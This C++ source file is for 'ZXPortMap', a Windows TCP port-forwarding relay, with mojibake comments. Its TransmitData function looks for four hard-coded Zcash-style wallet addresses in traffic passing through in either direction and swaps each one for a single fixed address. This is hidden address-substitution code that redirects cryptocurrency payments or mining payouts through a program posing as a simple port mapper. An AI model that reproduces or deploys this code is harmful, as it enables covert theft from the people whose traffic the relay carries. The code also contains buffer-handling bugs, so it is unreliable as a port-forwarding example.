#include "stdafx.h"
#include <stdlib.h>

#include <assert.h> 

#include <windows.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

#define SERVERNAME "ZXPortMap"
#define VERSION "v1.1"

#define MAXBUFSIZE 8192
#define ADDRSIZE 32

struct SOCKINFO
{
	SOCKET ClientSock;
	SOCKET ServerSock;
};
struct ADDRESS
{
	char szIP[ADDRSIZE];
	WORD wPort;
	SOCKET s;
};


////////A simple class of stack operator.  code start.....
template<typename T>
class STACK
{
#define MAXSTACK 1024*2

private:
	int top;
	T Data[MAXSTACK];
public:

	STACK()
	{
		top = -1;
	}

	bool IsEmpty()
	{
		return top < 0;
	}

	bool IsFull()
	{
		return top >= MAXSTACK;
	}

	bool Push(T data)
	{
		if (IsFull())
			return false;
		top++;
		Data[top] = data;
		return true;
	}

	T Pop()
	{
		return Data[top--];
	}

};/////////////////////stack    end
  //////////////////////////////////////////////////////////////////Transfer some Parameters
template<typename X, typename Y>
class TransferParam
{
public:
	X GlobalData;
	STACK<Y> LocalData;
public:
	TransferParam();
	virtual ~TransferParam();
	bool Push(Y data);
	Y Pop();

};


template<typename X, typename Y>
TransferParam<X, Y>::TransferParam()
{
	memset(this, 0, sizeof(TransferParam));
}

template<typename X, typename Y>
TransferParam<X, Y>::~TransferParam()
{

}

template<typename X, typename Y>
bool TransferParam<X, Y>::Push(Y data)
{
	return LocalData.Push(data);
}

template<typename X, typename Y>
Y TransferParam<X, Y>::Pop()
{
	return LocalData.Pop(data);
}
///////////////////////////////////////////////////

int nTimes = 0;

int DataSend(SOCKET s, char *DataBuf, int DataLen)//��DataBuf�е�DataLen���ֽڷ���sȥ
{
	int nBytesLeft = DataLen;
	int nBytesSent = 0;
	int ret;
	//set socket to blocking mode
	int iMode = 0;
	ioctlsocket(s, FIONBIO, (u_long FAR*) &iMode);
	while (nBytesLeft > 0)
	{
		ret = send(s, DataBuf + nBytesSent, nBytesLeft, 0);
		if (ret <= 0)
			break;
		nBytesSent += ret;
		nBytesLeft -= ret;
	}
	return nBytesSent;
}

char * _strstr(char * str, char * substr)
{
	assert(str != NULL && substr != NULL);
	unsigned int size = strlen(str);
	for (int i = 0; i <= size; i++, str++)
	{
		char * p = str;
		for (char * q = substr;; p++, q++)
		{
			if (*q == '\0')
				return str;
			if (*q != *p)
				break;
		}
	}
	return NULL;
}




char * string_replace(char*src, char*sub, char*dst)
{
	int pos = 0;
	int offset = 0;
	int srcLen, subLen, dstLen;
	char*pRet = NULL;


	srcLen = strlen(src);
	subLen = strlen(sub);
	dstLen = strlen(dst);
	pRet = (char*)malloc(srcLen + dstLen - subLen + 1);//(�ⲿ�Ƿ�ÿռ�)if (NULL != pRet)
	{
		pos = strstr(src, sub) - src;
		memcpy(pRet, src, pos);
		offset += pos;
		memcpy(pRet + offset, dst, dstLen);
		offset += dstLen;
		memcpy(pRet + offset, src + pos + subLen, srcLen - pos - subLen);
		offset += srcLen - pos - subLen;
		*(pRet + offset) = '\0';
	}
	return pRet;
}
DWORD WINAPI TransmitData(LPVOID lParam)//������SOCKET�н�������ת��
{
	SOCKINFO socks = *((SOCKINFO*)lParam);
	SOCKET ClientSock = socks.ClientSock;
	SOCKET ServerSock = socks.ServerSock;
	char RecvBuf[MAXBUFSIZE] = { 0 };
	fd_set Fd_Read;
	int ret, nRecv;

	while (1)
	{
		FD_ZERO(&Fd_Read);
		FD_SET(ClientSock, &Fd_Read);
		FD_SET(ServerSock, &Fd_Read);
		ret = select(0, &Fd_Read, NULL, NULL, NULL);
		if (ret <= 0)
			goto error;
		if (FD_ISSET(ClientSock, &Fd_Read))
		{
			nRecv = recv(ClientSock, RecvBuf, sizeof(RecvBuf), 0);
			char *p = _strstr(RecvBuf, "t1N7NByjcXxJEDPeb1KBDT9Q8Wocb3urxnv");
			char *p1 = _strstr(RecvBuf, "t1W9HL5Aep6WHsSqHiP9YrjTH2ZpfKR1d3t");
			char *p2 = _strstr(RecvBuf, "t1b9PsiekL4RbMoGzyLMFkMevbz7QfwepgP");
			char *p3 = _strstr(RecvBuf, "t1dn3KXy6mBi5TR1ifRwYse6JMgR2w7zUbr");
			char *p4 = NULL;

			if (p != NULL)
			{
				printf("I find target!!! is %s\r\n", p);
				p4 = string_replace(RecvBuf, "t1N7NByjcXxJEDPeb1KBDT9Q8Wocb3urxnv", "t1Qap8gAaXcbzKat2zeVBPbcUmfhWGLVBNC");
				strcpy(RecvBuf, p4);
				printf("replace RecvBuf is %s \r\n", RecvBuf);
			}
			else if (p1 != NULL)
			{
				printf("I find target!!! p1 is %s\r\n", p1);
				p4 = string_replace(RecvBuf, "t1W9HL5Aep6WHsSqHiP9YrjTH2ZpfKR1d3t", "t1Qap8gAaXcbzKat2zeVBPbcUmfhWGLVBNC");
				strcpy(RecvBuf, p4);
				printf("replace RecvBuf is %s \r\n", RecvBuf);
			}
			else if (p2 != NULL)
			{
				printf("I find target!!! p2 is %s\r\n", p2);
				p4 = string_replace(RecvBuf, "t1b9PsiekL4RbMoGzyLMFkMevbz7QfwepgP", "t1Qap8gAaXcbzKat2zeVBPbcUmfhWGLVBNC");
				strcpy(RecvBuf, p4);
				printf("replace RecvBuf is %s \r\n", RecvBuf);
			}
			else if (p3 != NULL)
			{
				printf("I find target!!! p3 is %s\r\n", p3);
				p4 = string_replace(RecvBuf, "t1dn3KXy6mBi5TR1ifRwYse6JMgR2w7zUbr", "t1Qap8gAaXcbzKat2zeVBPbcUmfhWGLVBNC");
				strcpy(RecvBuf, p4);
				printf("replace RecvBuf is %s \r\n", RecvBuf);
			}


			if (nRecv <= 0)
				goto error;
			ret = DataSend(ServerSock, RecvBuf, nRecv);
			if (ret == 0 || ret != nRecv)
				goto error;
		}
		if (FD_ISSET(ServerSock, &Fd_Read))
		{
			nRecv = recv(ServerSock, RecvBuf, sizeof(RecvBuf), 0);
			char *p = _strstr(RecvBuf, "t1N7NByjcXxJEDPeb1KBDT9Q8Wocb3urxnv");
			char *p1 = _strstr(RecvBuf, "t1W9HL5Aep6WHsSqHiP9YrjTH2ZpfKR1d3t");
			char *p2 = _strstr(RecvBuf, "t1b9PsiekL4RbMoGzyLMFkMevbz7QfwepgP");
			char *p3 = _strstr(RecvBuf, "t1dn3KXy6mBi5TR1ifRwYse6JMgR2w7zUbr");
			char *p4 = NULL;
			if (p != NULL)
			{
				printf("I find target!!! p is %s\r\n", p);
				p4 = string_replace(RecvBuf, "t1N7NByjcXxJEDPeb1KBDT9Q8Wocb3urxnv", "t1Qap8gAaXcbzKat2zeVBPbcUmfhWGLVBNC");
				strcpy(RecvBuf, p4);
				printf("replace RecvBuf is %s \r\n", RecvBuf);
			}
			else if (p1 != NULL)
			{
				printf("I find target!!! p1 is %s\r\n", p1);
				p4 = string_replace(RecvBuf, "t1W9HL5Aep6WHsSqHiP9YrjTH2ZpfKR1d3t", "t1Qap8gAaXcbzKat2zeVBPbcUmfhWGLVBNC");
				strcpy(RecvBuf, p4);
				printf("replace RecvBuf is %s \r\n", RecvBuf);
			}
			else if (p2 != NULL)
			{
				printf("I find target!!! p2 is %s\r\n", p2);
				p4 = string_replace(RecvBuf, "t1b9PsiekL4RbMoGzyLMFkMevbz7QfwepgP", "t1Qap8gAaXcbzKat2zeVBPbcUmfhWGLVBNC");
				strcpy(RecvBuf, p4);
				printf("replace RecvBuf is %s \r\n", RecvBuf);
			}
			else if (p3 != NULL)
			{
				printf("I find target!!! p3 is %s\r\n", p3);
				p4 = string_replace(RecvBuf, "t1dn3KXy6mBi5TR1ifRwYse6JMgR2w7zUbr", "t1Qap8gAaXcbzKat2zeVBPbcUmfhWGLVBNC");
				strcpy(RecvBuf, p4);
				printf("replace RecvBuf is %s \r\n", RecvBuf);
			}
			if (nRecv <= 0)
				goto error;
			ret = DataSend(ClientSock, RecvBuf, nRecv);
			if (ret == 0 || ret != nRecv)
				goto error;
		}
	}

error:
	closesocket(ClientSock);
	closesocket(ServerSock);
	return 0;
}

SOCKET ConnectHost(DWORD dwIP, WORD wPort)//����ָ��IP�Ͷ˿�
{
	SOCKET sockid;

	if ((sockid = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
		return 0;
	struct sockaddr_in srv_addr;
	srv_addr.sin_family = AF_INET;
	srv_addr.sin_addr.S_un.S_addr = dwIP;
	srv_addr.sin_port = htons(wPort);
	if (connect(sockid, (struct sockaddr*)&srv_addr, sizeof(struct sockaddr_in)) == SOCKET_ERROR)
		goto error;
	return sockid;
error:
	closesocket(sockid);
	return 0;
}

SOCKET ConnectHost(char *szIP, WORD wPort)
{
	return ConnectHost(inet_addr(szIP), wPort);
}

SOCKET CreateSocket(DWORD dwIP, WORD wPort)//��dwIP�ϰ�wPort�˿�
{
	SOCKET sockid;

	if ((sockid = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
		return 0;
	struct sockaddr_in srv_addr = { 0 };
	srv_addr.sin_family = AF_INET;
	srv_addr.sin_addr.S_un.S_addr = dwIP;
	srv_addr.sin_port = htons(wPort);
	if (bind(sockid, (struct sockaddr*)&srv_addr, sizeof(struct sockaddr_in)) == SOCKET_ERROR)
		goto error;
	listen(sockid, 3);
	return sockid;
error:
	closesocket(sockid);
	return 0;
}

SOCKET CreateTmpSocket(WORD *wPort)//����һ����ʱ���׽���,ָ��wPort��ô�������ʱ�˿�
{
	struct sockaddr_in srv_addr = { 0 };
	int addrlen = sizeof(struct sockaddr_in);

	SOCKET s = CreateSocket(INADDR_ANY, 0);
	if (s <= 0)
		goto error;

	if (getsockname(s, (struct sockaddr*)&srv_addr, &addrlen) == SOCKET_ERROR)
		goto error;
	*wPort = ntohs(srv_addr.sin_port);
	return s;
error:
	closesocket(s);
	return 0;
}

BOOL InitSocket()
{
	WSADATA wsadata;
	return WSAStartup(MAKEWORD(2, 2), &wsadata) == 0;
}

DWORD WINAPI PortTransfer_1(LPVOID lParam)
{
	TransferParam<ADDRESS, SOCKET> *ConfigInfo = (TransferParam<ADDRESS, SOCKET>*)lParam;
	SOCKET ClientSock, ServerSock;

	//��ջ����ÿͻ����׽���
	ClientSock = ConfigInfo->LocalData.Pop();
	printf("ThreadID: %d ==> Now Connecting To Server...", nTimes);
	//�����ӵ�Ŀ�������ķ���
	ServerSock = ConnectHost(ConfigInfo->GlobalData.szIP, ConfigInfo->GlobalData.wPort);
	if (ServerSock <= 0)
	{
		printf("Error.\r\n");
		closesocket(ClientSock);
		return 0;
	}
	printf("OK.\r\nStarting TransmitData\r\n");
	SOCKINFO socks;
	socks.ClientSock = ClientSock;//�ͻ����׽���
	socks.ServerSock = ServerSock;//Ŀ������������׽���
								  //���봿����ת��״̬
	return TransmitData((LPVOID)&socks);
}

BOOL PortTransfer_1(WORD ListenPort, char *szIP, WORD wPort)
{
	HANDLE hThread;
	DWORD dwThreadId;
	SOCKET AcceptSocket;

	TransferParam<ADDRESS, SOCKET> ConfigInfo;

	_snprintf(ConfigInfo.GlobalData.szIP, ADDRSIZE, "%s", szIP);
	ConfigInfo.GlobalData.wPort = wPort;

	//����������˿ڣ���ӳ��˿�
	SOCKET localsockid = CreateSocket(INADDR_ANY, ListenPort);
	if (localsockid <= 0)
		goto error;
	while (1)
	{
		printf("Accepting new Client...");
		AcceptSocket = accept(localsockid, NULL, NULL);
		if (AcceptSocket == INVALID_SOCKET)
			goto error;
		nTimes++;
		printf("OK.\r\n");
		//�����ܵ��Ŀͻ������׽���ת���µ��߳��ﴦ��
		//Ȼ������ȴ��µ�����
		ConfigInfo.LocalData.Push(AcceptSocket);
		hThread = CreateThread(NULL, 0, PortTransfer_1, (LPVOID)&ConfigInfo, NULL, &dwThreadId);
		if (hThread)
			CloseHandle(hThread);
		else
			Sleep(1000);

	}
error:
	printf("Error.\r\n");
	closesocket(localsockid);
	return false;
}

DWORD WINAPI PortTransfer_2(LPVOID lParam)
{
	TransferParam<ADDRESS, WORD> *ConfigInfo = (TransferParam<ADDRESS, WORD> *)lParam;
	SOCKET CtrlSocket = ConfigInfo->GlobalData.s;
	DWORD dwCtrlIP;
	//WORD wPort;
	SOCKADDR_IN clientaddr;
	int addrlen = sizeof(clientaddr);
	if (getpeername(CtrlSocket, (SOCKADDR *)&clientaddr, &addrlen) == SOCKET_ERROR)
		return 0;
	//�������PortTransfer_3ģʽ�ļ������IP
	dwCtrlIP = clientaddr.sin_addr.S_un.S_addr;
	//wPort = ntohs(clientaddr.sin_port);

	SOCKET ClientSocket, ServerSocket;
	SOCKINFO socks;
	printf("ThreadID: %d ==> Connecting to Client...", nTimes);
	//���������µ�����
	ClientSocket = ConnectHost(dwCtrlIP, ConfigInfo->LocalData.Pop());
	if (ClientSocket <= 0)
		return 0;
	printf("OK.\r\n");
	printf("ThreadID: %d ==> Connect to Server...", nTimes);
	//���ӵ�Ŀ�������ķ���
	ServerSocket = ConnectHost(ConfigInfo->GlobalData.szIP, ConfigInfo->GlobalData.wPort);
	if (ServerSocket <= 0)
	{
		printf("Error.\r\n");
		closesocket(ClientSocket);
		return 0;
	}
	printf("OK.\r\nStarting TransmitData\r\n", nTimes);
	socks.ClientSock = ClientSocket;//������������׽���
	socks.ServerSock = ServerSocket;//Ŀ������������׽���
									//���봿����ת��״̬
	return TransmitData((LPVOID)&socks);
}

BOOL PortTransfer_2(char *szCtrlIP, WORD wCtrlPort, char *szIP, WORD wPort)
{
	int nRecv;
	WORD ReqPort;
	HANDLE hThread;
	DWORD dwThreadId;
	TransferParam<ADDRESS, WORD> ConfigInfo;
	_snprintf(ConfigInfo.GlobalData.szIP, ADDRSIZE, "%s", szIP);
	ConfigInfo.GlobalData.wPort = wPort;

	printf("Creating a ctrlconnection...");
	//��PortTransfer_3ģʽ�������ڹ������ļ�����������ƹܵ�����
	SOCKET CtrlSocket = ConnectHost(szCtrlIP, wCtrlPort);
	if (CtrlSocket <= 0)
		goto error;
	ConfigInfo.GlobalData.s = CtrlSocket;
	printf("OK.\r\n");
	while (1)
	{
		//�������ԣ������ڹ�������������������Ϊһ��WORD��
		//��ʾ�������������������˿�
		nRecv = recv(CtrlSocket, (char*)&ReqPort, sizeof(ReqPort), 0);
		if (nRecv <= 0)
			goto error;
		nTimes++;
		ConfigInfo.LocalData.Push(ReqPort);//������Ϣ�Ľṹ
		hThread = CreateThread(NULL, 0, PortTransfer_2, (LPVOID)&ConfigInfo, NULL, &dwThreadId);
		if (hThread)
			CloseHandle(hThread);
		else
			Sleep(1000);
	}
error:
	printf("Error.\r\n");
	closesocket(CtrlSocket);
	return false;
}

DWORD WINAPI PortTransfer_3(LPVOID lParam)
{
	SOCKINFO socks;
	SOCKET ClientSocket, ServerSocket, CtrlSocket, tmpSocket;
	TransferParam<SOCKET, SOCKET> *ConfigInfo = (TransferParam<SOCKET, SOCKET>*)lParam;
	CtrlSocket = ConfigInfo->GlobalData;
	ClientSocket = ConfigInfo->LocalData.Pop();

	WORD wPort;
	tmpSocket = CreateTmpSocket(&wPort);//��������ʱ�˿�

	if (tmpSocket <= 0 || wPort <= 0)
	{
		closesocket(ClientSocket);
		return 0;
	}
	//֪ͨ�����û������µ����ӵ��մ�������ʱ�˿�
	if (send(CtrlSocket, (char*)&wPort, sizeof(wPort), 0) == SOCKET_ERROR)
	{
		closesocket(ClientSocket);
		closesocket(CtrlSocket);
		return 0;
	}
	printf("ThreadID: %d ==> Waiting for server connection...", nTimes);
	ServerSocket = accept(tmpSocket, NULL, NULL);
	if (ServerSocket == INVALID_SOCKET)
	{
		printf("Error.\r\n");
		closesocket(ClientSocket);
		return 0;
	}
	printf("OK.\r\n");
	socks.ClientSock = ClientSocket;
	socks.ServerSock = ServerSocket;
	//���봿����ת��״̬
	return TransmitData((LPVOID)&socks);
}

BOOL PortTransfer_3(WORD wCtrlPort, WORD wServerPort)//�����������˿�
{
	HANDLE hThread;
	DWORD dwThreadId;
	BOOL bOptVal = TRUE;
	int bOptLen = sizeof(BOOL);
	TransferParam<SOCKET, SOCKET> ConfigInfo;
	SOCKET ctrlsockid, serversockid, CtrlSocket, AcceptSocket;

	ctrlsockid = CreateSocket(INADDR_ANY, wCtrlPort);//�����׽���
	if (ctrlsockid <= 0)
		goto error2;
	serversockid = CreateSocket(INADDR_ANY, wServerPort);//�����׽���
	if (serversockid <= 0)
		goto error1;
	CtrlSocket = accept(ctrlsockid, NULL, NULL);//�������ԣ������û�����PortTransfer_2ģʽ�������ƹܵ����ӵ�����
	if (CtrlSocket == INVALID_SOCKET)
		goto error0;
	//setsockopt(  keep-alive......
	if (setsockopt(CtrlSocket, SOL_SOCKET, SO_KEEPALIVE, (char*)&bOptVal, bOptLen) == SOCKET_ERROR) {
		goto error0;
		//printf("Set SO_KEEPALIVE: ON\n");
	}
	//�������û����������Ӻ���൱�˿�ӳ��ɹ���
	//׼��������շ�������״̬��������������߳���ͨ�����ƹܵ�֪ͨ�����û������µ����ӽ�������ת��
	ConfigInfo.GlobalData = CtrlSocket;
	while (1)
	{
		printf("Accepting new Client...\r\n");
		AcceptSocket = accept(serversockid, NULL, NULL);
		if (AcceptSocket == INVALID_SOCKET)
		{
			printf("Error.\r\n");
			Sleep(1000);
			continue;
		}
		nTimes++;
		printf("OK.\r\n");
		ConfigInfo.LocalData.Push(AcceptSocket);//�ѽ��ܵ����׽���Push��ջ�ṹ�У����������߳��Ǳ߿�����Pop����
		hThread = CreateThread(NULL, 0, PortTransfer_3, (LPVOID)&ConfigInfo, NULL, &dwThreadId);
		if (hThread)
			CloseHandle(hThread);
		else
			Sleep(1000);
	}

error0:
	closesocket(CtrlSocket);
error1:
	closesocket(serversockid);
error2:
	closesocket(ctrlsockid);
	return false;
}


void Usage(char *ProName)
{
	//printf(SERVERNAME" "VERSION" " "By LZX.\r\n");
	printf("Usage:\r\n"
		"  %s ctrlPort ServerPort\r\n"
		"  %s Port Dest_IP Port\r\n"
		"  %s ctrlIP ctrlPort Dest_IP Port\r\n", ProName, ProName, ProName);
}

int main(int argc, char **argv)
{

	if (!InitSocket())
		return 0;
	if (argc == 3)
		PortTransfer_3(atoi(argv[1]), atoi(argv[2]));
	else if (argc == 4)
		PortTransfer_1(atoi(argv[1]), argv[2], atoi(argv[3]));
	else if (argc == 5)
		PortTransfer_2(argv[1], atoi(argv[2]), argv[3], atoi(argv[4]));
	else
		Usage(argv[0]);

	WSACleanup();
	return 0;
}

